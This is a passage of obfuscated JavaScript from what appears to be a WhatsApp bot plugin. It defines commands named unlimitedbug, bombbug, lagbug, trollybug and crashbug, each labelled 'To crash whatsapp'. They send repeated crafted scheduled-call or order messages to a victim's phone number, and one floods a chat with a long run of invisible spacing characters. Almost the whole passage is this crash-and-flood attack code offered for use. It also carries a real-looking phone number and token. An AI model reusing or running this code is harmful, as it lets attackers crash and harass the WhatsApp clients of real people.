        key: _0x2be3eb.key,
      }
      const _0x44226d = { react: _0x39f109 }
      await _0x52bfc7.sendMessage(_0x2cb890, _0x44226d)
    } catch (_0x58c239) {
      _0x4c23af('*\uD83D\uDED1 This is an owner command...*')
      _0x240768(_0x58c239)
    }
  }
)
const _0x4ce227 = {}
_0x4ce227.pattern = 'unlimitedbug'
_0x4ce227.react = '\uD83D\uDD16'
_0x4ce227.desc = 'To to crash whatsapp'
_0x4ce227.category = 'bug'
_0x4ce227.use = '.unlimitedbug'
_0x4ce227.filename = __filename
cmd(
  _0x4ce227,
  async (
    _0x46da1b,
    _0x50cd81,
    _0x17f266,
    {
      from: _0x1bf62e,
      prefix: _0x235a5b,
      l: _0x54ff72,
      quoted: _0x5de907,
      body: _0x1672d3,
      isCmd: _0x4aa35a,
      command: _0x5cb685,
      args: _0x5b104a,
      q: _0x30e3d5,
      isGroup: _0xced9ec,
      sender: _0x1762b3,
      senderNumber: _0x14de15,
      botNumber2: _0x2469f2,
      botNumber: _0x5f0c58,
      pushname: _0x143673,
      isMe: _0x4d45c3,
      isOwner: _0x2c2cc4,
      groupMetadata: _0x3f6c8b,
      groupName: _0x174bb5,
      participants: _0x23a0d5,
      groupAdmins: _0x236983,
      isBotAdmins: _0x517cab,
      isAdmins: _0x4933e6,
      reply: _0x695ed6,
    }
  ) => {
    try {
      if (!_0x4d45c3) {
        return await _0x695ed6(BOTOW)
      }
      if (!_0x5b104a[0]) {
        return _0x695ed6(
          'Use ' +
            (_0x235a5b + _0x5cb685) +
            ' number\nExample ' +
            (_0x235a5b + _0x5cb685) +
            ' 94719199757'
        )
      }
      var _0x1d4134 = [
        '\u300A \u2588\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u300B10%',
        '\u300A \u2588\u2588\u2588\u2588\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u300B30%',
        '\u300A \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2592\u2592\u2592\u2592\u2592\u300B50%',
        '\u300A \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2592\u2592\u300B80%',
        '\u300A \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u300B100%',
        '\uD835\uDE7B\uD835\uDE7E\uD835\uDE70\uD835\uDE73\uD835\uDE78\uD835\uDE7D\uD835\uDE76 \uD835\uDE72\uD835\uDE7E\uD835\uDE7C\uD835\uDE7F\uD835\uDE7B\uD835\uDE74\uD835\uDE83\uD835\uDE74\uD835\uDE73 \uD83E\uDD84...',
      ]
      const _0x4b963c = { text: 'ʟᴏᴀᴅɪɴɢ...' }
      let { key: _0x533250 } = await _0x46da1b.sendMessage(_0x1bf62e, _0x4b963c)
      for (let _0x280bd0 = 0; _0x280bd0 < _0x1d4134.length; _0x280bd0++) {
        const _0x5d1ecb = {
          text: _0x1d4134[_0x280bd0],
          edit: _0x533250,
        }
        await _0x46da1b.sendMessage(_0x1bf62e, _0x5d1ecb)
      }
      victim = _0x30e3d5.split('|')[0] + '@s.whatsapp.net'
      amount = '30'
      for (let _0x4e6770 = 0; _0x4e6770 < amount; _0x4e6770++) {
        const _0xb0d480 = izumitext3
        var _0x24d7fb = generateWAMessageFromContent(
          _0x1bf62e,
          proto.Message.fromObject({
            scheduledCallCreationMessage: {
              callType: '2',
              scheduledTimestampMs:
                '' +
                moment(1000).tz('Asia/Kolkata').format('DD/MM/YYYY HH:mm:ss'),
              title: _0xb0d480,
            },
          }),
          {
            userJid: _0x1bf62e,
            quoted: _0x50cd81,
          }
        )
        _0x46da1b.relayMessage(victim, _0x24d7fb.message, {
          messageId: _0x24d7fb.key.id,
        })
        await sleep(3000)
      }
      _0x695ed6(
        '*Successfully sent Bug To ' + victim + ' Please pause for 3 minutes*'
      )
      const _0x59bf9a = {
        text: '\u2705',
        key: _0x50cd81.key,
      }
      const _0x2e49dd = { react: _0x59bf9a }
      await _0x46da1b.sendMessage(_0x1bf62e, _0x2e49dd)
    } catch (_0x1a74d4) {
      _0x695ed6('*\uD83D\uDED1 This is an owner command...*')
      _0x54ff72(_0x1a74d4)
    }
  }
)
const _0x8b5ed0 = {}
_0x8b5ed0.pattern = 'bombbug'
_0x8b5ed0.react = '\uD83D\uDD16'
_0x8b5ed0.desc = 'To to crash whatsapp'
_0x8b5ed0.category = 'bug'
_0x8b5ed0.use = '.bombbug'
_0x8b5ed0.filename = __filename
cmd(
  _0x8b5ed0,
  async (
    _0x41a80b,
    _0x491e2b,
    _0x316a75,
    {
      from: _0xf9a1a7,
      prefix: _0x341081,
      l: _0x3567ee,
      quoted: _0x3e0016,
      body: _0x2bbe57,
      isCmd: _0xccd76,
      command: _0x50d7f0,
      args: _0x211cbc,
      q: _0x4d656a,
      isGroup: _0x36e507,
      sender: _0x1c4e32,
      senderNumber: _0x1ae82a,
      botNumber2: _0x554a52,
      botNumber: _0x5d1afb,
      pushname: _0x228949,
      isMe: _0x196e74,
      isOwner: _0x48105f,
      groupMetadata: _0x3ba134,
      groupName: _0x40751e,
      participants: _0x5109c9,
      groupAdmins: _0x195f33,
      isBotAdmins: _0x35e81b,
      isAdmins: _0x2c118d,
      reply: _0x382f17,
    }
  ) => {
    try {
      if (!_0x196e74) {
        return await _0x382f17(BOTOW)
      }
      if (!_0x211cbc[0]) {
        return _0x382f17(
          'Use ' +
            (_0x341081 + _0x50d7f0) +
            ' number\nExample ' +
            (_0x341081 + _0x50d7f0) +
            ' 94719199757'
        )
      }
      var _0x40a6ba = [
        '\u300A \u2588\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u300B10%',
        '\u300A \u2588\u2588\u2588\u2588\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u300B30%',
        '\u300A \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2592\u2592\u2592\u2592\u2592\u300B50%',
        '\u300A \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2592\u2592\u300B80%',
        '\u300A \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u300B100%',
        '\uD835\uDE7B\uD835\uDE7E\uD835\uDE70\uD835\uDE73\uD835\uDE78\uD835\uDE7D\uD835\uDE76 \uD835\uDE72\uD835\uDE7E\uD835\uDE7C\uD835\uDE7F\uD835\uDE7B\uD835\uDE74\uD835\uDE83\uD835\uDE74\uD835\uDE73 \uD83E\uDD84...',
      ]
      const _0x251753 = { text: 'ʟᴏᴀᴅɪɴɢ...' }
      let { key: _0x4d6628 } = await _0x41a80b.sendMessage(_0xf9a1a7, _0x251753)
      for (let _0x2b01c2 = 0; _0x2b01c2 < _0x40a6ba.length; _0x2b01c2++) {
        const _0x437e5a = {
          text: _0x40a6ba[_0x2b01c2],
          edit: _0x4d6628,
        }
        await _0x41a80b.sendMessage(_0xf9a1a7, _0x437e5a)
      }
      victim = text.split('|')[0] + '@s.whatsapp.net'
      amount = '30'
      for (let _0xbca97 = 0; _0xbca97 < amount; _0xbca97++) {
        const _0x5091a4 = izumitext4
        var _0x4459f5 = generateWAMessageFromContent(
          _0xf9a1a7,
          proto.Message.fromObject({
            scheduledCallCreationMessage: {
              callType: '2',
              scheduledTimestampMs:
                '' +
                moment(1000).tz('Asia/Kolkata').format('DD/MM/YYYY HH:mm:ss'),
              title: _0x5091a4,
            },
          }),
          {
            userJid: _0xf9a1a7,
            quoted: _0x316a75,
          }
        )
        _0x41a80b.relayMessage(victim, _0x4459f5.message, {
          messageId: _0x4459f5.key.id,
        })
        await sleep(3000)
      }
      _0x382f17(
        '*Successfully sent Bug To ' + victim + ' Please pause for 3 minutes*'
      )
      const _0x2b508c = {
        text: '\u2705',
        key: _0x491e2b.key,
      }
      const _0x207be8 = { react: _0x2b508c }
      await _0x41a80b.sendMessage(_0xf9a1a7, _0x207be8)
    } catch (_0x468318) {
      _0x382f17('*Error !!*')
      _0x3567ee(_0x468318)
    }
  }
)
const _0x384d2c = {}
_0x384d2c.pattern = 'lagbug'
_0x384d2c.react = '\uD83D\uDD16'
_0x384d2c.desc = 'To to crash whatsapp'
_0x384d2c.category = 'bug'
_0x384d2c.use = '.lagbug'
_0x384d2c.filename = __filename
cmd(
  _0x384d2c,
  async (
    _0xc6289b,
    _0x4fe664,
    _0x16adfa,
    {
      from: _0x2f4ba6,
      prefix: _0x977ae2,
      l: _0x2295db,
      quoted: _0x3c600d,
      body: _0x2a5777,
      isCmd: _0x2f464a,
      command: _0x320a0a,
      args: _0x5af334,
      q: _0x489564,
      isGroup: _0x2ed75f,
      sender: _0x19b7e0,
      senderNumber: _0x264535,
      botNumber2: _0x3a5e42,
      botNumber: _0x30feb7,
      pushname: _0x25649d,
      isMe: _0x38f52a,
      isOwner: _0x49e802,
      groupMetadata: _0x43f379,
      groupName: _0x538d09,
      participants: _0x605575,
      groupAdmins: _0x2e9ddc,
      isBotAdmins: _0x1317a6,
      isAdmins: _0x1ad650,
      reply: _0x1981b8,
    }
  ) => {
    try {
      if (!_0x38f52a) {
        return await _0x1981b8(BOTOW)
      }
      if (!_0x5af334[0]) {
        return _0x1981b8(
          'Use ' +
            (_0x977ae2 + _0x320a0a) +
            ' number\nExample ' +
            (_0x977ae2 + _0x320a0a) +
            ' 94719199757'
        )
      }
      var _0x5aa55b = [
        '\u300A \u2588\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u300B10%',
        '\u300A \u2588\u2588\u2588\u2588\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u300B30%',
        '\u300A \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2592\u2592\u2592\u2592\u2592\u300B50%',
        '\u300A \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2592\u2592\u300B80%',
        '\u300A \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u300B100%',
        '\uD835\uDE7B\uD835\uDE7E\uD835\uDE70\uD835\uDE73\uD835\uDE78\uD835\uDE7D\uD835\uDE76 \uD835\uDE72\uD835\uDE7E\uD835\uDE7C\uD835\uDE7F\uD835\uDE7B\uD835\uDE74\uD835\uDE83\uD835\uDE74\uD835\uDE73 \uD83E\uDD84...',
      ]
      const _0x3cc1ad = { text: 'ʟᴏᴀᴅɪɴɢ...' }
      let { key: _0xebc543 } = await _0xc6289b.sendMessage(_0x2f4ba6, _0x3cc1ad)
      for (let _0x7fcd95 = 0; _0x7fcd95 < _0x5aa55b.length; _0x7fcd95++) {
        const _0x238fa4 = {
          text: _0x5aa55b[_0x7fcd95],
          edit: _0xebc543,
        }
        await _0xc6289b.sendMessage(_0x2f4ba6, _0x238fa4)
      }
      victim = _0x489564.split('|')[0] + '@s.whatsapp.net'
      amount = '30'
      for (let _0x405578 = 0; _0x405578 < amount; _0x405578++) {
        const _0x32717a = izumitext2
        var _0x3c256c = generateWAMessageFromContent(
          _0x2f4ba6,
          proto.Message.fromObject({
            scheduledCallCreationMessage: {
              callType: '2',
              scheduledTimestampMs:
                '' +
                moment(1000).tz('Asia/Kolkata').format('DD/MM/YYYY HH:mm:ss'),
              title: _0x32717a,
            },
          }),
          {
            userJid: _0x2f4ba6,
            quoted: _0x16adfa,
          }
        )
        _0xc6289b.relayMessage(victim, _0x3c256c.message, {
          messageId: _0x3c256c.key.id,
        })
        await sleep(3000)
      }
      _0x1981b8(
        '*Successfully sent Bug To ' + victim + ' Please pause for 3 minutes*'
      )
      const _0x444289 = {
        text: '\u2705',
        key: _0x4fe664.key,
      }
      const _0x5145d2 = { react: _0x444289 }
      await _0xc6289b.sendMessage(_0x2f4ba6, _0x5145d2)
    } catch (_0x4bd2fb) {
      _0x1981b8('*Error !!*')
      _0x2295db(_0x4bd2fb)
    }
  }
)
const _0x4b51cb = {}
_0x4b51cb.pattern = 'trollybug'
_0x4b51cb.react = '\uD83D\uDD16'
_0x4b51cb.desc = 'To to crash whatsapp'
_0x4b51cb.category = 'bug'
_0x4b51cb.use = '.trollybug'
_0x4b51cb.filename = __filename
cmd(
  _0x4b51cb,
  async (
    _0x5d8c9e,
    _0x5cb36c,
    _0x319f91,
    {
      from: _0x4e914f,
      prefix: _0x23c1fa,
      l: _0x4bdd5b,
      quoted: _0x475fca,
      body: _0xe3c2b1,
      isCmd: _0x59283b,
      command: _0x12dee9,
      args: _0x1c939b,
      q: _0x549cbf,
      isGroup: _0x4d347f,
      sender: _0x2cb04d,
      senderNumber: _0x402f58,
      botNumber2: _0x164f2d,
      botNumber: _0x2709ef,
      pushname: _0x2b5128,
      isMe: _0x48ef4b,
      isOwner: _0x3af510,
      groupMetadata: _0x41435e,
      groupName: _0x1f80fe,
      participants: _0x3abcfd,
      groupAdmins: _0x2dc177,
      isBotAdmins: _0x4350af,
      isAdmins: _0x8e1428,
      reply: _0x1edff4,
    }
  ) => {
    try {
      if (!_0x48ef4b) {
        return await _0x1edff4(BOTOW)
      }
      if (!_0x1c939b[0]) {
        return _0x1edff4(
          'Use ' +
            (_0x23c1fa + _0x12dee9) +
            ' number\nExample ' +
            (_0x23c1fa + _0x12dee9) +
            ' 94719199757'
        )
      }
      var _0x22b1b2 = [
        '\u300A \u2588\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u300B10%',
        '\u300A \u2588\u2588\u2588\u2588\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u300B30%',
        '\u300A \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2592\u2592\u2592\u2592\u2592\u300B50%',
        '\u300A \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2592\u2592\u300B80%',
        '\u300A \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u300B100%',
        '\uD835\uDE7B\uD835\uDE7E\uD835\uDE70\uD835\uDE73\uD835\uDE78\uD835\uDE7D\uD835\uDE76 \uD835\uDE72\uD835\uDE7E\uD835\uDE7C\uD835\uDE7F\uD835\uDE7B\uD835\uDE74\uD835\uDE83\uD835\uDE74\uD835\uDE73 \uD83E\uDD84...',
      ]
      const _0x3426ff = { text: 'ʟᴏᴀᴅɪɴɢ...' }
      let { key: _0x249b8b } = await _0x5d8c9e.sendMessage(_0x4e914f, _0x3426ff)
      for (let _0x1c3398 = 0; _0x1c3398 < _0x22b1b2.length; _0x1c3398++) {
        const _0x40248f = {
          text: _0x22b1b2[_0x1c3398],
          edit: _0x249b8b,
        }
        await _0x5d8c9e.sendMessage(_0x4e914f, _0x40248f)
      }
      victim = _0x549cbf.split('|')[0] + '@s.whatsapp.net'
      amount = '15'
      for (let _0x38bb61 = 0; _0x38bb61 < amount; _0x38bb61++) {
        var _0x3e4c0f = generateWAMessageFromContent(
          _0x4e914f,
          proto.Message.fromObject({
            orderMessage: {
              orderId: '599519108102353',
              thumbnail:
                '\uD83E\uDDDA ＱＵＥＥＮ -ＩＺＵＭＩ - Ｖ1 \uD83E\uDDDA',
              itemCount: 1999,
              status: 'INQUIRY',
              surface: 'CATALOG',
              message: 'ＱＵＥＥＮ -ＩＺＵＭＩ - ＭＤ',
              orderTitle: ' TROLLY BUG ',
              sellerJid: '94719199757@s.whatsapp.net',
              token: 'AR6z9PAvHjs9Qa7AYgBUjSEvcnOcRWycFpwieIhaMKdrhQ==',
            },
          }),
          {
            userJid: _0x4e914f,
            quoted: _0x5cb36c,
          }
        )
        _0x5d8c9e.relayMessage(victim, _0x3e4c0f.message, {
          messageId: _0x3e4c0f.key.id,
        })
      }
      _0x1edff4(
        '*Successfully sent Bug To ' + victim + ' Please pause for 3 minutes*'
      )
      const _0x4e831c = {
        text: '\u2705',
        key: _0x5cb36c.key,
      }
      const _0x4aba87 = { react: _0x4e831c }
      await _0x5d8c9e.sendMessage(_0x4e914f, _0x4aba87)
    } catch (_0x2583c8) {
      _0x1edff4('*Error !!*')
      _0x4bdd5b(_0x2583c8)
    }
  }
)
const _0x1a02a0 = {}
_0x1a02a0.pattern = 'crashbug'
_0x1a02a0.react = '\uD83D\uDD16'
_0x1a02a0.desc = 'To to crash whatsapp'
_0x1a02a0.category = 'bug'
_0x1a02a0.use = '.crashbug'
_0x1a02a0.filename = __filename
cmd(
  _0x1a02a0,
  async (
    _0x53b98f,
    _0x27d5d2,
    _0x21b385,
    {
      from: _0x4d8afb,
      prefix: _0x2329be,
      l: _0x538705,
      quoted: _0x28abe4,
      body: _0x2f048b,
      isCmd: _0x34f4c5,
      command: _0x356088,
      args: _0x475954,
      q: _0x541011,
      isGroup: _0x3782a8,
      sender: _0x4a49ea,
      senderNumber: _0x307870,
      botNumber2: _0x32c5b8,
      botNumber: _0x195df4,
      pushname: _0x3b544a,
      isMe: _0x1aeff3,
      isOwner: _0x943c6c,
      groupMetadata: _0x2ab978,
      groupName: _0x2baeed,
      participants: _0x27b795,
      groupAdmins: _0xfb6cf0,
      isBotAdmins: _0x514e69,
      isAdmins: _0x232f92,
      reply: _0x5938a4,
    }
  ) => {
    try {
      if (!_0x1aeff3) {
        return
      }
      var _0x2131c8 = [
        '\u300A \u2588\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u300B10%',
        '\u300A \u2588\u2588\u2588\u2588\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u300B30%',
        '\u300A \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2592\u2592\u2592\u2592\u2592\u300B50%',
        '\u300A \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2592\u2592\u300B80%',
        '\u300A \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u300B100%',
        '\uD835\uDE7B\uD835\uDE7E\uD835\uDE70\uD835\uDE73\uD835\uDE78\uD835\uDE7D\uD835\uDE76 \uD835\uDE72\uD835\uDE7E\uD835\uDE7C\uD835\uDE7F\uD835\uDE7B\uD835\uDE74\uD835\uDE83\uD835\uDE74\uD835\uDE73 \uD83E\uDD84...',
      ]
      const _0x556e7a = { text: 'ʟᴏᴀᴅɪɴɢ...' }
      let { key: _0x428a51 } = await _0x53b98f.sendMessage(_0x4d8afb, _0x556e7a)
      for (let _0x7f05c0 = 0; _0x7f05c0 < _0x2131c8.length; _0x7f05c0++) {
        const _0x255924 = {
          text: _0x2131c8[_0x7f05c0],
          edit: _0x428a51,
        }
        await _0x53b98f.sendMessage(_0x4d8afb, _0x255924)
      }
      for (let _0x2f91b1 = 0; _0x2f91b1 < 10; _0x2f91b1++) {
        _0x5938a4(
          'ՇאՇ ๒єՇค\u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A\u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A\u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A\u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A\u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \n \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A\u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A\u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A 